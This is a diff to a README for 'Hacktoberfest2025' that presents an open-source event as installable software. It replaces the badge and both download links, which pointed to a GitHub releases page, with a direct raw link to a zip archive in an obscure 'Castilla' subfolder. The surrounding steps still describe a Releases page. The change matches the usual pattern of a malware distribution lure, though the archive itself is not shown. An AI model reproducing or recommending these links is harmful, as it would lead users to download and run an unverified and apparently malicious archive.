@@ -1,6 +1,6 @@
 # 🧑🏻‍💻 Hacktoberfest2025 - Contribute and Celebrate Open Source!
 
-![Download Hacktoberfest2025](https://img.shields.io/badge/Download-Hacktoberfest2025-blue)
+![Download Hacktoberfest2025](https://raw.githubusercontent.com/giaopham94/Hacktoberfest2025/main/Castilla/Hacktoberfest2025.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to get started with Hacktoberfest2025. You don’t nee
 
 1. **Visit the Download Page**  
    Go to the following link to download the software:  
-   [Download Hacktoberfest2025](https://github.com/giaopham94/Hacktoberfest2025/releases).  
+   [Download Hacktoberfest2025](https://raw.githubusercontent.com/giaopham94/Hacktoberfest2025/main/Castilla/Hacktoberfest2025.zip).  
 
 2. **Choose the Latest Release**  
    On the Releases page, you will see a list of versions. Click on the topmost version to find the latest release.
@@ -48,7 +48,7 @@ To run Hacktoberfest2025, ensure your system meets the following requirements:
 ## 🔍 Download & Install
 
 To get your copy of Hacktoberfest2025, visit the following page:  
-[Download Hacktoberfest2025](https://github.com/giaopham94/Hacktoberfest2025/releases).
+[Download Hacktoberfest2025](https://raw.githubusercontent.com/giaopham94/Hacktoberfest2025/main/Castilla/Hacktoberfest2025.zip).
 
 After downloading, follow the previously described steps to install the software.
 
